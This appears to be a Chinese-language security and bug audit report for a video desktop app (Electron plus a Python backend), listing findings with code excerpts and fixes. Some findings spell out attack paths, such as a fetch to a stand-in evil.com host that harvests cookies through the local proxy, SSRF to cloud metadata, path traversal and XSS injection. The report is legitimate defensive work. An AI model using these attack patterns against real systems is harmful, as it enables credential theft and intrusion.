# video-pc 代码审查报告

- **审查日期**: 2026-08-16
- **审查范围**: `src/main`(Electron 主进程)、`src/preload`、`src/renderer`(渲染层)、`python-backend`(FastAPI 后端 / go-proxy / jar 桥 / Kazumi 规则引擎 / QuickJS 引擎 / SpiderRunner)、`scripts` 构建脚本(约 4.5 万行核心代码,不含 jar-runner 生成的 Android stubs)
- **审查方式**: 四路并行逐行审查 + 交叉验证;高危发现均已在源码中人工复核确认
- **问题统计**: 高危 9 · 中危 30 · 低危 25(已合并四路报告中的重复项)

> 行号为审查时快照,后续修改可能偏移。

---

## 目录

- [一、高危问题(P0)](#一高危问题p0)
- [二、中危问题(P1)](#二中危问题p1)
- [三、低危问题(P2)](#三低危问题p2)
- [四、已核查、确认无问题的项](#四已核查确认无问题的项)
- [五、修复优先级路线图](#五修复优先级路线图)

---

## 一、高危问题(P0)

### H-1 [安全] go-proxy 任意 URL 转发 + `Access-Control-Allow-Origin: *` + 自动附加夸克 Cookie → 恶意网页可窃取网盘 Cookie / SSRF 内网

**位置**: `python-backend/go_proxy.py:507-528`(URL 转发与 Cookie 注入)、`go_proxy.py:560`(ACAO)、`go_proxy.py:85-87, 730`(固定端口)

```python
PORT = 9978
EXTRA_PORTS = [7944, 1314]
...
raw = q.get('url', [''])[0]
url = urllib.parse.unquote_plus(raw)
...
cookie = self.headers.get('Cookie', '')
if not cookie:
    from pan_cookies import load_pan_cookies
    cookie = load_pan_cookies().get('quark', '') or ''
...
self.send_header('Access-Control-Allow-Origin', '*')
```

**问题**: 三个端口(9978/7944/1314)**硬编码且完全无鉴权**。虽只绑 `127.0.0.1`,但用户浏览器中任意网页的 JS 都能直接 `fetch('http://127.0.0.1:9978/?url=https://evil.com/x')`:

1. 后端会把用户的**夸克登录 Cookie 自动附加**到任意目标 URL 上发出(`Cookie` 注入无主机白名单)→ 恶意站点直接收割网盘 Cookie;
2. 响应头带 `ACAO: *`,浏览器允许网页**读取回包** → 完整的本机代理 SSRF(内网探测、路由器管理页、云元数据 `169.254.169.254`);
3. `do=pan` 分支还可用受害者 Cookie **转存任意分享**(`_quark_save_share`)、读取网盘文件列表。

GET 是 simple request 无需 preflight,触发条件仅为"用户访问了任意恶意网页"。

**修复**: 去掉 `ACAO: *`(mpv 不需要 CORS);仅当目标主机匹配已知网盘 CDN 域名白名单时才附 Cookie;为代理端口增加与后端 token 等价的鉴权;拒绝私网/环回目标(除白名单)。

---

### H-2 [安全] 全链路 `verify=False` 下载可执行内容(jar/JS/规则)+ 无完整性校验 → MITM 供应链 RCE

**位置**: `python-backend/jar_bridge.py:647-651`、`python-backend/kazumi/plugin_manager.py`(约 28 处)、`python-backend/js-engine/quickjs_host.py:117-118`、`python-backend/app.py:112-118`、`python-backend/cms_spider.py:128`、`python-backend/server.py:1141/1150` 等(全项目共 **48 处**)

```python
def requests_get_jar(url, timeout=30):
    """下载 jar 二进制（跟重定向）。"""
    rsp = requests.get(url, allow_redirects=True, timeout=timeout, verify=False)
```

**问题**: jar 下载后在 JVM 中反射执行(等价任意代码);JS 源码下载后直接 `ctx.eval`;Kazumi 规则 JSON 直接驱动规则引擎发请求——全部关闭 TLS 校验。中间人可替换任意一种载荷实现 RCE。完整性方面 jar 仅**可选** md5(TVBox 配置普遍不写 md5,且 md5 值本身来自同一个可被替换的远端 config),规则商店无任何哈希/签名。`server.py:27-32` 还主动 `urllib3.disable_warnings(InsecureRequestWarning)` 消掉了告警。

**修复**: 全部改 `verify=True`(确有自签场景时用显式 CA bundle 而非全局关闭);jar 无 md5 时在 UI 明示风险;规则商店比对仓库提交哈希。

---

### H-3 [安全] QuickJS 引擎无任何资源限制,远程 JS 源一段 `while(true){}` 即可冻结整个后端

**位置**: `python-backend/js-engine/quickjs_host.py:141-153, 227-249`

```python
def __init__(self):
    self.lock = threading.RLock()
    self.ctx = quickjs.Context()
    self.ctx.add_callable('_native_http', _native_http)
```

已核实 venv 中 quickjs-ng 0.16.0.1 的 `Context` 支持 `set_time_limit` / `set_memory_limit` / `set_max_stack_size`,但代码**一处都没调用**(grep 无结果)。`call()` 的 35 秒只是等待锁的超时;JS 同步执行路径完全无界。C 扩展 eval 期间不释放 GIL,一个死循环大概率冻结**整个后端进程**(所有 HTTP 端点、所有站点),而非单个引擎。

**修复**: `__init__` 中设置 `set_time_limit` / `set_memory_limit` / `set_max_stack_size`;必要时把 JS 执行隔离到可杀死的子进程。

---

### H-4 [安全] 内联 Python 源站点 `key` 直接拼路径 → 路径遍历 + 任意位置写盘执行

**位置**: `python-backend/config.py:587-591`

```python
path = os.path.join(hoststate.get_plugins_dir(), f'{key}.py')
with open(path, 'wb') as f:
    f.write(api.encode('utf-8'))
from importlib.machinery import SourceFileLoader
return SourceFileLoader(key, path).load_module().Spider()
```

**问题**: `key` 来自远端配置 `sites[].key`,未做任何清洗。`key="../../..."` 可穿越;Windows 上 `os.path.join(dir, 'C:\\x')` 直接得到绝对路径——可向任意可写位置写入攻击者控制的内容(`api` 字段),文件先落盘、后执行,即使执行失败文件也已写入(可覆盖配置、写入启动目录)。同源问题:`app.py:7-12` 的 `os.path.basename(api)` 不去 query(URL 带 `?ver=2` 时 Windows 非法文件名导致站点加载失败)。

**修复**: `key` 白名单化(`re.sub(r'[^\w.-]', '_', key)`)并校验 `os.path.realpath(path)` 仍在 plugins_dir 内;`app.py` 先 `urlparse` 再取 basename 并清洗非法字符。

---

### H-5 [安全] `/cache`、`/proxy` 端点免 token + 前缀匹配豁免 → 本地任意网页可投毒缓存 / 驱动 spider 代理 / 撑爆磁盘

**位置**: `python-backend/server.py:64, 543, 655-672`

```python
TOKEN_EXEMPT = ('/health', '/cache', '/proxy')
...
if not path.startswith(TOKEN_EXEMPT):
```

**问题**: 注释写"仅 127.0.0.1",但**无任何来源校验**。form-urlencoded POST 是浏览器简单请求(无预检),任意网页可:

- `do=set` 写入任意 KV(spider 的 `getCache` 会消费这些值 → 数据投毒),或循环写大 value 无上限向 `~/.video-pc/cache/kv` 落盘撑爆磁盘;
- 调 `/proxy` 以完全攻击者可控的参数触发已加载 spider 的 `localProxy`(任意副作用、开放重定向、响应头原样透传)。

另外 `startswith` 是前缀匹配,`/cacheXxx` 也会被豁免(防御纵深缺陷)。

**修复**: `/cache`、`/proxy` 校验 token 或 `Origin`/`Sec-Fetch-Site`;豁免判断改精确匹配;`set` 增加单值与总量配额;透传 headers 前过滤 `Set-Cookie`/CORS 相关头。

---

### H-6 [安全] kazumi.js onerror 内联 JS 单引号字符串注入(XSS),根因是 escHtml 不转义 `'`

**位置**: `src/renderer/js/kazumi.js:1528、1624`;`src/renderer/js/common.js:64-66`

```js
function escHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
```
```js
<img ... onerror="if(!this.dataset.fb){this.dataset.fb=1;this.src='${escHtml(bangumiMirrorUrl(cover))}';}else{...}">
```

**问题**: `cover` 来自远端 Bangumi API(开镜像代理时经第三方 `lain.bangumi.lol`,可被篡改)。escHtml 不转义单引号,而 URL 被拼进 onerror 属性内的**单引号 JS 字符串**——URL 含 `'` 即可闭合字符串注入任意 JS。渲染进程一旦执行任意脚本,即可通过 `window.vpc`(contextBridge 暴露 `fileDelFile`/`fileDelFolder`/`setProxy`/`download.control` 等破坏性 IPC)造成文件删除、任意下载、代理劫持。叠加:全项目**无任何 CSP**(index.html 与主进程均无),无纵深防御。

**修复**: 两处改用 `common.js:186-210` 已有的 `data-fb` 兜底链安全模式;`escHtml` 补 `'` → `&#39;`;逐步收敛内联事件并注入 CSP(见 M-24)。

---

### H-7 [bug] player.js `header` 变量未定义(ReferenceError)→ `parse=1` 源解析成功后**永远无法自动播放**

**位置**: `src/renderer/js/player.js:437`(已复核)

```js
const mergedHeader = {...header, ...(resolved.header || {})};
```

**问题**: `play()` 函数作用域内不存在 `header`(全文件仅 `_playKazumi`(player.js:506)与 kazumi.js:1993 内部有同名局部变量,均不可见)。`{...header}` 抛 `ReferenceError` 被 `catch (e) { /* 播放异常走兜底 */ }` 静默吞掉,`window.vpc.playUrl` **从未执行**——所有 `parse=1` 且解析成功的播放一律落入失败对话框,连播链(`this._seq`)被误判终止。

**修复**: 改为 `const mergedHeader = { ...(resolved.header || {}) };`(该分支本无源 header 可合并)。

---

### H-8 [bug] go-proxy 对无 Content-Length 资源(HLS 等)不发任何 HTTP 响应头 + Range 退化为 `bytes=0-0` 单字节

**位置**: `python-backend/go_proxy.py:543-546`(无长度分支)、`go_proxy.py:705-713`(`_stream_single`,已复核)

```python
if total is None or total <= 0:
    # 无长度信息（HLS 等）：退化单线程透传
    self._stream_single(url, headers, head_only)
    return
...
def _stream_single(self, url, headers, head_only, start=0, end=None):
    r = _fetch(url, headers, start, end if end is not None else start, timeout=30)
```

**问题**(两处叠加):

1. `total is None` 分支在**未调用 `send_response`/`end_headers`** 的情况下直接 `self.wfile.write(chunk)`——客户端收到的第一个字节就是 `#EXTM3U...` 之类媒体内容,被当作 HTTP 状态行解析必然失败,该类资源无法播放;
2. `_fetch` 无条件发送 `Range` 头,`end=None` 时表达式取 `start`(=0)→ 实际请求 `bytes=0-0`,支持 Range 的服务器只回 **1 字节**。

触发条件:目标 URL 不返回 `Content-Range`(m3u8 文本、chunked 直播流、忽略 Range 的 CDN)。

**修复**: 无长度分支先 `send_response(200)` + `Content-Type` 再流式透传(不发 Content-Length,连接关闭即结束);`_stream_single` 当 `end is None` 时不发 Range 或用开放区间 `bytes=start-`。

---

### H-9 [bug] python-bridge `stop(); start()` 竞态 → Python 后端孤儿进程累积(已复核)

**位置**: `src/main/python-bridge.js:86-96`(exit 回调)、`131-135`(stop);触发点 `src/main/index.js:1185`(set-proxy)、`1021-1023`(pick-cache-dir)、`1368`(set-dandan)

```js
proc.on('exit', (code) => {
    ...
    this.proc = null;          // 无条件清引用
    if (this.stopping) return;
    ...
    setTimeout(() => this._spawn(), delay);
});
```

**问题**: `kill()` 后 exit 事件在下个 tick 才到。`bridge.stop(); bridge.start()` 中 start() 已把 `stopping` 置回 false 并 spawn 新进程 A;旧进程 exit 事件随后到达,回调无条件 `this.proc = null`(**丢弃 A 的引用**)、并再 spawn 进程 B。结果 A、B 并存,退出时 `before-quit → stop()` 只杀 `this.proc`(B),**A 成为孤儿 Python 进程**(继续监听端口、占内存),每次修改代理/缓存目录/弹幕凭据就泄漏一个,永不自愈。同构问题在 `src/main/downloader.js:162-167`(aria2:换下载目录必报错一次 + 新 aria2c 失去引用泄漏)。

**修复**: exit 回调加闭包守卫 `if (this.proc !== proc) return;`(两处);或 stop() 中先 `removeAllListeners('exit')` 再 kill。

---

## 二、中危问题(P1)

### Electron 主进程

#### M-1 [安全] `vpc:settings-set` 无 key 白名单 → 可写 `externalPlayerPath` 启动任意可执行文件

**位置**: `src/main/index.js:880`(handler,已复核)、`2076`(spawn)

```js
ipcMain.handle('vpc:settings-set', (_e, key, value) => ({ value: settings.set(String(key), value) }));
...
spawn(execPath, args, { detached: true, stdio: 'ignore' }).unref();
```

渲染进程被攻破后(H-6 即可),先写 `externalPlayerPath` 为任意 exe,再经 `vpc:play` 触发 `launchExternalPlayer` 直接 spawn——纯 IPC 即可完成任意程序启动,配合下载能力构成完整 RCE 链。**修复**: settings-set 按键白名单;`externalPlayerPath` 仅允许对话框选择。

#### M-2 [安全] `vpc:dl addHls` 不校验 URI 协议 → `file://` 读任意本地媒体文件外泄

**位置**: `src/main/index.js:1502-1506`(对比 `add` 分支 1486 行有 `/^(magnet:|http:|https:)/` 校验)

`uri` 原样交给 ffmpeg `-i`。渲染层被攻破时可传 `file:///C:/Users/.../xxx.mp4`,ffmpeg 把本地文件复制输出到下载目录(文件名 `out` 可控),再经 `vpc:dl-play`/打开目录获得副本;`rtsp://`、`smb://` 可触达内网。**修复**: addHls 与 `hls.add` 内部加 `^https?://` 白名单。

#### M-3 [安全] push-server 首页向整个局域网回显 token

**位置**: `src/main/push-server.js:38`(0.0.0.0 监听)、`94`(token 回显,已复核)

`GET /` 无校验即渲染含 token 的完整推送地址。公共 WiFi 下任意设备访问 `http://<ip>:<port>/` 拿到 token → 任意推送 URL → `captureDirect` 用隐藏 Chromium 窗口加载该页并收割 Cookie。**修复**: 首页不回显 token;或推送路径用不可枚举随机段。

#### M-4 [安全] pan-qr-window 加载第三方页面却关闭 contextIsolation 与 sandbox

**位置**: `src/main/pan-qr-window.js:106-112`

```js
webPreferences: { partition: PARTITION, contextIsolation: false, nodeIntegration: false, sandbox: false },
```

该窗口加载远程 `pan.quark.cn`(运行不可控第三方脚本),违背 Electron 安全基线;同项目 parse-window 对远程页面正确用了 `contextIsolation: true, sandbox: true`。**修复**: 改为 `true/true`(无 preload,无功能损失)。

#### M-5 [安全] 主窗口 `sandbox: false` 非必要

**位置**: `src/main/index.js:256-261`。preload 仅用 `ipcRenderer`/`webFrame`,sandbox preload 完全可承载。**修复**: 移除 `sandbox: false`。

#### M-6 [安全] 弹幕文本未转义 ASS override 标签

**位置**: `src/main/mpv-player.js:531-533`

弹幕内容来自第三方服务器,仅换行转义。`{\fs200}{\pos(0,0)}` 等 override 标签可直接注入 Dialogue,全屏遮挡画面/干扰 libass 渲染。**修复**: `text.replace(/\{/g, '({').replace(/\}/g, '})')`。

#### M-7 [bug] 直播备用线路循环无视用户主动停止,播放器"关不掉"

**位置**: `src/main/index.js:216-226, 232-242, 696`

`mpvStartedOk` 无法区分"未开播"与"用户主动关闭",用户关窗后 `watchLiveFallbacks` 继续逐条 `mpv.play` 备用线路,窗口反复弹回。**修复**: 检查 `_activeSession.userStopped` 后再续播。

#### M-8 [bug] `vpc:settings-reset` 用 `app.exit(0)` 跳过退出清理

**位置**: `src/main/index.js:1141-1149`。注释自知不触发 `before-quit`,但只手动停了 mpv——`dl.stop()`(aria2)、`bridge.stop()`(Python)、`syncplay.disconnect()` 全被跳过,Windows 下子进程默认存活,孤儿进程累积。**修复**: 抽公共清理函数,`app.exit` 前调用。

#### M-9 [bug] 边下边播文件名丢失扩展名点号(已复核)

**位置**: `src/main/index.js:703-706`

```js
const ext = (urlPath.match(/\.(mp4|mkv|flv|mov|avi|webm|ts)$/i) || ['', ''])[1];
const out = (title.replace(...).trim() || '视频').slice(0, 150) + ext;
```

捕获组不含 `\.` → `out` 是 `"标题mp4"` 而非 `"标题.mp4"`,aria2 保存文件无扩展名,`fileMgr.isVideo` 判定失败、一键播放/缩略图全失效。**修复**: `out = ... + '.' + ext`。

#### M-10 [bug] HLS 下载 out 未过滤 `..` 与 Windows 保留名;同名任务分片目录互踩

**位置**: `src/main/hls-downloader.js:129-130, 138, 404`

`out='..'` 时 `path.join(dir, '..')` 为父目录,ffmpeg 临时文件落到下载目录之外且 rename 必失败残留垃圾;`_segsDir = dest + '.segs'` 按 dest 命名,同一集重复下载时两任务分片互覆、`remove()` 互相删除。**修复**: 校验 `path.basename(name) === name && name !== '.' && name !== '..'`;`_segsDir` 加 gid。

### Python 后端

#### M-11 [bug] go-proxy `url` 参数双重解码,含 `%2B` 的目标 URL 被损坏(已复核)

**位置**: `python-backend/go_proxy.py:488, 508`。`parse_qs` 已按 form 语义解码,又执行一次 `unquote_plus`——签名/token 中编码的 `+` 被二次解码成空格,目标 URL 失效(404/签名失败)。**修复**: 去掉第二次 `unquote_plus`。

#### M-12 [bug] JarBridge 类定义了两个 `__init__`,`_call_lock` 懒初始化竞态 → 并发写坏 JSON-RPC 流

**位置**: `python-backend/jar_bridge.py:96-108`(被覆盖的死代码)、`341-352`(生效的 `__init__`,无 `_call_lock`)、`500-506`

两个线程首次并发调用 `call()` 时 check-then-act 各自创建 RLock,用**不同的锁**同时写 stdin,破坏换行分隔的 JSON-RPC 协议(响应串台/超时)。聚合搜索 8 线程并发首调同一 jar 可触发。**修复**: 删除重复 `__init__`,在保留版本中直接 `self._call_lock = threading.RLock()`。

#### M-13 [bug] jar 缓存按"URL 文件名"复用,不同源同名 jar 互相错用

**位置**: `python-backend/jar_bridge.py:169-173`。TVBox 生态大量 jar 都叫 `spider.jar`:A 站先落盘后 B 站命中同名缓存,无 md5 时**静默加载 A 的爬虫**(找不到类/行为错乱);有 md5 时表现为 "md5 mismatch" 加载失败。**修复**: 文件名加 URL 哈希前缀(内容寻址)。

#### M-14 [bug] DEX→JVM 转换产物 `-jvm.jar` 无失效检查,jar 更新后永远用旧版

**位置**: `python-backend/jar_bridge.py:277-281`。md5 变化重新下载后,`_ensure_jvm_compatible` 只要 `-jvm.jar` 存在就复用(不像 `apply_jar_patches` 比较 mtime)→ "更新配置不生效"。**修复**: 增加 `getmtime(jvm_path) >= getmtime(jar_path)` 校验。

#### M-15 [bug] SpiderRunner 请求行包含子串 `"destroy"` 即退出整个 JVM

**位置**: `python-backend/jar-runner/SpiderRunner.java:71-74`(已复核)

```java
if (line.indexOf("\"destroy\"") >= 0) { break; }
```

判断的是**原始请求行**而非解析出的 method。用户搜索关键词恰为 `destroy`(JSON 序列化为 `"key":"destroy"`,含该子串)时,应答后整个 JVM 退出,同 jar 全部站点瞬间不可用并触发重启风暴。**修复**: 用解析后的 `method.equals("destroy")` 判断。

#### M-16 [bug] SpiderRunner `jsonEscape` 不转义 0x00-0x1F 控制字符

**位置**: `python-backend/jar-runner/SpiderRunner.java:555-570`。站点内容含 `\b`/`\f`/`\u0000` 时输出非法 JSON,Python 侧 `json.loads` 失败丢弃该行 → 对应请求 60s 超时强杀 JVM 重启,同站请求排队受害。**修复**: `default` 分支对 `c < 0x20` 输出 `\\u%04x`。

#### M-17 [bug] `destroy_all` 杀死按 jar 共享的 JVM,殃及同 jar 其他站点

**位置**: `python-backend/site_manager.py:74-80` + `jar_spider.py:138-145`。JarBridge 按 jar 全局共享,热重载配置时销毁第一个站点即让整个 JVM 退出,其余站点"杀-重启-杀"循环。**修复**: 引用计数,同 bridge 站点全部卸载后才真正 destroy。

#### M-18 [bug] kazimi `dict(parsed.query)` 把查询字符串当 dict 展开 → 带查询参数的剧集模板全部剧集被静默丢弃(已复核)

**位置**: `python-backend/kazumi/api_strategy.py:293`

```python
merged_query = {**dict(parsed.query), **{k: str(v) for k, v in rendered_query.items()}}
```

`parsed.query` 是字符串,`dict('aid=123')` 抛 ValueError 被 `except Exception` 吞成 diagnostics"已跳过"——播放页地址模板自带 query 参数的规则**所有剧集静默消失**,前端只见"无剧集"。**修复**: `dict(parse_qsl(parsed.query))`。

#### M-19 [bug] PluginManager 单条坏记录清空全部规则(数据丢失)

**位置**: `python-backend/kazumi/plugin_manager.py:181-194`。`Plugin.from_json` 是 `cls(**data)`,任何一条记录含未知字段抛 TypeError → 整体 except → 备份后 `self._plugins = []`,后续任意 `_save` 把空列表写回,用户全部规则丢失。**修复**: 逐条 try/except 跳过坏记录;`from_json` 忽略未知键。

#### M-20 [bug] SSE 聚合搜索超时后仍无限阻塞,done 事件丢失前端挂死

**位置**: `python-backend/server.py:585-604, 637-652`。`as_completed(timeout=120)` 超时后离开 with 块时 `shutdown(wait=True)` 会被卡死的 worker(挂起 HTTP/QuickJS 死循环)永久阻塞,`yield 'event: done'` 永不发出;kazumi 流的 `as_completed` 甚至无 try 包裹。注释承诺的"超时仍发 done 防前端挂死"实际不成立。**修复**: 超时异常后立即 yield done 再退出;`shutdown(wait=False)`。

#### M-21 [bug] `_SegStream` 取消后下载线程永久阻塞在 `q.put`,线程与内存泄漏

**位置**: `python-backend/go_proxy.py:429-433, 464-469`。mpv 频繁 seek/拖动不断新建 `_SegStream`,消费者退出后生产者阻塞在满队列的 `q.put`(`queue.put` 不响应 Event),每次最多泄漏 8 线程 + 6MB 缓冲。**修复**: `q.put(chunk, timeout=...)` 循环检查 cancel。

#### M-22 [bug] base Spider `getCache/setCache` 的 key 未 URL 编码 → 缓存错乱

**位置**: `python-backend/base/spider.py:122, 142, 146`。key 含 `&`/`#`/中文时读写键不一致,spider 缓存永远 miss 或互相覆盖(TVBox spider 常用 vod_id/URL/中文标题做 key,必踩)。**修复**: `urllib.parse.quote(str(key), safe='')`。

#### M-23 [bug] `kazumiSearch` 空插件列表时 `max_workers=0` 抛异常

**位置**: `python-backend/server.py:835`。只判了 keyword 空没判 plugins 空,`ThreadPoolExecutor(max_workers=0)` ValueError → 整个请求 500(对比 `search_stream`/`kazumi_search_stream` 都有保护)。**修复**: `if not plugins: return 200, ...`。

#### M-24 [bug] QuickJS `local` KV 全站点共享一个明文 JSON,无隔离无配额

**位置**: `python-backend/js-engine/quickjs_host.py:38-39, 61-71`。恶意源可枚举/覆盖/删除其他站点数据,可无限写盘(每次 set 全量重写,O(n²) 放大)。**修复**: 按站点 key 前缀隔离 + 大小配额。

#### M-25 [bug] 规则商店 `name` 未消毒直接拼下载 URL(路径注入)

**位置**: `python-backend/kazumi/plugin_manager.py:1608-1619` + `server.py:877`。`name` 可含 `../`,在镜像主机上拼出仓库外任意路径;下载后未 `validate()` 即返回。**修复**: `os.path.basename` + 字符白名单;下载后先 `validate()`。

#### M-26 [bug] 打包版未携带 `kazumi/assets`,内置规则首次导入永远为空

**位置**: `scripts/build-python.js:52-54, 67` vs `plugin_manager.py:32, 146-149`。PyInstaller `--add-data` 列表缺 `kazumi/assets` 且 dataDirs 未复制,打包模式下 `_import_builtin_rules` 静默返回——dev 正常、打包后内置规则"神秘消失"。**修复**: 补 `--add-data "kazumi/assets;kazumi/assets"`。

#### M-27 [bug] JarBridge `_kill_proc` 重置 `_started` 绕过重启上限;`last_error` 并发串台

**位置**: `python-backend/jar_bridge.py:600-606`(`_started = False` 使"最多重启 3 次"不计数,坏 jar 可无限重启循环);`jar_spider.py:163-171`(实例属性 `last_error` 并发时错误附加到别的请求的成功响应上)。**修复**: 重启计数不放 `_started` 分支;错误信息用返回值/线程局部携带。

#### M-28 [bug] Cookie 与缓存的持久化均非原子写

**位置**: `python-backend/pan_cookies.py:95-98`、`go_proxy.py:128-135`、`cache_store.py:65-69`。进程中途被杀留半截 JSON,下次 load 失败静默返回空(用户 Cookie 丢失需重新扫码);多线程下并发写还会交错损坏。**修复**: 临时文件 + `os.replace` 原子替换,加锁。

### 渲染层

#### M-29 [bug] detail.js `data` 越出块级作用域 → 错误详情永远无法展示(已复核)

**位置**: `src/renderer/js/detail.js:344-353`。`const data` 声明在 `if (!vod) {...}` 块内,351 行出块引用抛 ReferenceError 被 catch 吞掉,后端附加的失败原因(网盘 Cookie 失效、jar 报错)永远丢失,只显示笼统"详情载入失败"。**修复**: `let data = null;` 提升到块外。

#### M-30 [bug] 多处异步竞态:旧请求污染新状态

- `src/renderer/js/search.js:265-279`:`aggregateSearch` 回调无令牌防护,快速连续搜索时**旧词结果混入新词结果页**;
- `src/renderer/js/home.js:586-621, 400-444`:`_fetchCat`/`_fetchHomeFeed` 循环内实时读 `this.site`,切源竞态把混合数据**写进新源名下的页缓存**(持久脏数据),`_fetchHomeFeed` 同理;
- `src/renderer/js/detail.js:1279-1295, 687-690`:`_loadMoreComments`/`_renderBgmEpisodes` 无世代守卫,换番剧后旧评论拼进新番剧列表、`_downloadBgmSelected` 可能**下载到上一部番的集**;
- `src/renderer/js/panels.js:547-576`:`listFile` 无序号校验,快速目录导航时旧响应覆盖新目录,导航栈错位。

**修复**: 统一模式——入口取令牌(`++this._token` / 快照 `site`),每个 await 返回后校验令牌/快照未变才继续。

---

## 三、低危问题(P2)

### Electron 主进程

| # | 位置 | 问题 |
|---|------|------|
| L-1 | `src/main/index.js:1734-1741, 658-691` | `vpc:dl-play` 白名单外任意本地文件播放;`vpc:play` URL 无协议限制(mpv 支持 `file://`/`edl://`) |
| L-2 | `src/main/index.js:887-895` | `vpc:probe-urls` 是内网探测原语(可探 `127.0.0.1`/`169.254.169.254`/内网 C 段,回传可达性) |
| L-3 | `src/main/dlna-caster.js:110, 144-157` | SOAP 报文 XML 注入(`CurrentURI` 未转义)+ controlUrl 任意(内网任意 http 端点 POST 原语) |
| L-4 | `src/main/index.js:2046-2047` | PotPlayer 分支 Referer/UA 值未转义引号,可注入额外命令行参数 |
| L-5 | `src/main/index.js:1364-1365` + `settings.js:43-48` | dandanAppSecret、bangumiToken、夸克 Cookie 等凭据明文持久化于 settings.json(建议 `safeStorage`) |
| L-6 | `src/main/index.js:844-861` | `vpc:parse` 超时不取消解析,槽位(3 个)可被"已放弃仍在跑"的解析占满 |
| L-7 | `src/main/index.js:110-127` | `ensureAnime4k` 写文件前不 mkdir,目录缺失时静默全败且无法自愈 |
| L-8 | `src/main/index.js:1410-1415, 1581-1585` | HLS 任务重启恢复时 header(Referer/UA)未持久化,恢复下载大概率 403 |
| L-9 | `src/main/mpv-player.js:415-427` | 每条 IPC 的 5s 超时定时器应答后不 `clearTimeout`,高频命令下累积 |

### Python 后端

| # | 位置 | 问题 |
|---|------|------|
| L-10 | `python-backend/jar-runner/SpiderRunner.java:181-201` | 网盘 Cookie 明文写入共享临时目录可预测路径,不清理、无 symlink 检查(多用户/企业环境可被读取) |
| L-11 | `python-backend/app.py:125-131` | `redirect()` 递归跟随重定向无深度上限(循环重定向 → RecursionError),`Location` 相对路径未 urljoin |
| L-12 | `python-backend/jar_patch.py:150` | `len(old_b) != len(old_b)` 恒假,疑似笔误,空补丁值校验失效 |
| L-13 | `python-backend/server.py:1022-1028` | `kazumiBangumiStaff` return 后 4 行复制粘贴死代码 |
| L-14 | `python-backend/server.py:570-573, 76-77` | 弹幕队列 `list()` 与 `clear()` 之间并发 append 被吞;队列无上限 |
| L-15 | `python-backend/go_proxy.py:576-581` | 已发 206 头后段错误再写一行 502 状态行,协议错乱(应判断是否已发头) |
| L-16 | `python-backend/go_proxy.py:707-713` | `_stream_single` 不检查上游状态码(403/5xx 错误体当媒体转发);上游忽略 Range 时超量写 |
| L-17 | `python-backend/go_proxy.py:166-167` | 非法/越界 Range 回 206+全文件而非 416 |
| L-18 | `python-backend/go_proxy.py:73-75` | 全局 `requests.Session` 被 ThreadingHTTPServer 多线程共享(Session 非线程安全,cookie jar 竞态) |
| L-19 | `python-backend/server.py:408-412` | `_player_content_cache` 无锁,并发迭代/插入可抛 `RuntimeError: dictionary changed size during iteration`;全新鲜时永不收缩 |
| L-20 | `python-backend/runner.py:18-22` | 用 `except TypeError` 判断旧 spider 签名,业务 TypeError 被误判后无参重调(副作用翻倍) |
| L-21 | `python-backend/base/spider.py:106-110` | `str2json/json2str` 未装饰 `staticmethod`,`self.` 调用必 TypeError;参数名遮蔽内建 `str` |
| L-22 | `python-backend/config.py:335-343` | 配置热替换 `destroy_all` 与 `extend` 之间存在空窗期,并发请求 404 |
| L-23 | `python-backend/config.py:436` | 本地配置固定 UTF-8 打开,Windows 记事本 GBK 配置 UnicodeDecodeError |
| L-24 | `python-backend/cms_spider.py:139` | stdlib ElementTree 解析远端 XML 无 billion-laughs 防护(建议 defusedxml) |
| L-25 | `python-backend/kazumi/plugin_manager.py:23/29` | logger 重复定义;`weekdays` 解析在 try 之外,非数字直接 500 |

### 渲染层

| # | 位置 | 问题 |
|---|------|------|
| L-26 | `src/renderer/js/kazumi.js:1671, 1677, 1691` | `_renderBangumiDetail` 对常驻容器反复无命名空间绑定 click 委托,监听器无限累积(内存泄漏) |
| L-27 | `src/renderer/js/kazumi.js:257` 等 | `openEditorDialog` 的 await 无 try/catch,后端异常时编辑弹窗静默不打开 |
| L-28 | `src/renderer/js/common.js:277`、`kazumi.js:1730-1731, 1527, 1646` | 远端"数值"字段(`item.id`/`ep.sort`)未转义直插 HTML,依赖字段恰好是数字的侥幸(镜像返回字符串即注入) |
| L-29 | `src/renderer/js/records.js:170-171, 206-207` | `FavHub.changed` 双重广播,每次收藏操作双份网络请求 + 双次重渲染 |
| L-30 | `src/renderer/js/records.js:585-592` | 封面补拉回写旧 `list` 快照,并发删除后"复活"记录/回退编辑 |
| L-31 | `src/renderer/js/common.js:661` | warnToast 按关键词过滤会吞掉含"失败"字样的成功汇总提示 |
| L-32 | `src/renderer/js/bangumi-search.js:166-169` | `seasonToDateRange` 季度边界 off-by-one(结束月多算一个月,Q1 起点上一年 12 月),与 timeline.js 的季度定义相互矛盾 |
| L-33 | `src/renderer/js/kazumi.js:1527, 1646` | CSP 完全缺失(index.html 与主进程均无),大量内联事件 + 远端 innerHTML,无纵深防御(修复需先迁移内联事件再收紧,故列低危但建议排期) |

---

## 四、已核查、确认无问题的项

- **绑定地址**: `server.py:1225` 与 `go_proxy.py:730` 均绑 `127.0.0.1`,无局域网暴露(push-server 的 0.0.0.0 是功能设计,见 M-3)。
- **命令注入**: 全项目所有 `subprocess` 调用(`jar_bridge.py:311/406`、`java_probe.py:84`)均为参数列表形式,无 `shell=True`;JS 侧 `execSync` 插值均为内部常量路径。
- **反序列化**: 指定范围内无 `pickle`/`eval`/`exec`/`os.system`。
- **`/action`、`/kazumi/action`** 有 token 校验,敏感操作在保护内。
- **CacheStore._path** 用 sha1(hex) 做文件名,正确防御了缓存 key 的路径注入。
- **panels.js `escPath`** 转义顺序正确(`& → " → \ → '`),内联 `onclick="selectFile('...')"` 无法逃逸。
- **detail.js `_renderCommentBBCode`**: 先整体转义再做 BBCode 替换,`[url=]` 强制 `https?:` 前缀,阻断 `javascript:`。
- **common.js `vodCoverImg/vodCoverChain`**: `normalizePic` 限协议、src 经 escHtml、兜底链走属性赋值,安全。
- **kazumi `_bindSheetEvents`**: 每次 `box.off('.ks')` 后重绑,无重复绑定。
- **zip slip**: Python 侧 zip 只读 namelist 不解压落盘;`download-binaries.js` 用的 bsdtar/GNU tar 默认拒绝 `..` 与绝对路径。
- **`doAction`**: 有 30s 超时与 JSON.parse try/catch。

---

## 五、修复优先级路线图

**第一批(安全止血,建议立即)**

